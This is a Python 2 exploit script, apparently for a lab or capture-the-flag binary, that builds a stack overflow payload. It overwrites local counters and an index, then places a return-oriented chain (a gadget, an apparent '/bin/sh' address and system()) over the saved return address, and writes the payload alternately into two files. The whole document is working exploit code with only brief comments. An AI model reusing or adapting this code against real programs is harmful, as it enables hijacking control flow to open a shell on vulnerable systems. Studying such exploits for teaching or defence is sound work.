import sys

def pack32(n):
    s = ""
    while n:
        s += chr(n % 0x100)
        n = n / 0x100
    s = s.ljust(4, "\x00")
    return s

def pack64(n):
    s = ""
    while n:
        s += chr(n % 0x100)
        n = n / 0x100
    s = s.ljust(8, "\x00")
    return s

bufaddr = 0x7ffffffedaa0
br2addr = 0x7ffffffedaf4
br1addr = 0x7ffffffedaf8
idxaddr = 0x7ffffffedafc
retaddr = 0x7ffffffedb08

gadget1 = 0x004007d3
binaddr = 0x7fffff1bcd57
system  = 0x7fffff075390

payload_len = retaddr - bufaddr + 8 + 16
print("Total length of payload should be: ", payload_len)

payload = ""
payload += "A" * (br2addr - bufaddr)

# byte_read1, byte_read2:
#   Half of length of payload
payload += pack32(payload_len / 2)
payload += pack32(payload_len / 2)

# idx:
#   Value of idx at the time we overwrite idx
#   We note that since little endian, we overwrite the relevant counting bit immediately
#   This is equivalent to total number of bytes written so far, excluding this byte
payload += pack32(idxaddr - bufaddr)

# Pad until just before return address
payload += "A" * (retaddr - (idxaddr + 4))

payload += pack64(gadget1)
payload += pack64(binaddr)
payload += pack64(system)

print("Length of payload is ", len(payload))
assert len(payload) == payload_len

open("exploit1", "w").close()
open("exploit2", "w").close()

e1 = open("exploit1", "r+b")
e2 = open("exploit2", "r+b")

for i in range(len(payload)):
    if (i % 2) == 0:
        # Write 1 byte to exploit1
        e1.write(payload[i])
    else:
        # Write 1 byte to exploit2
        e2.write(payload[i])

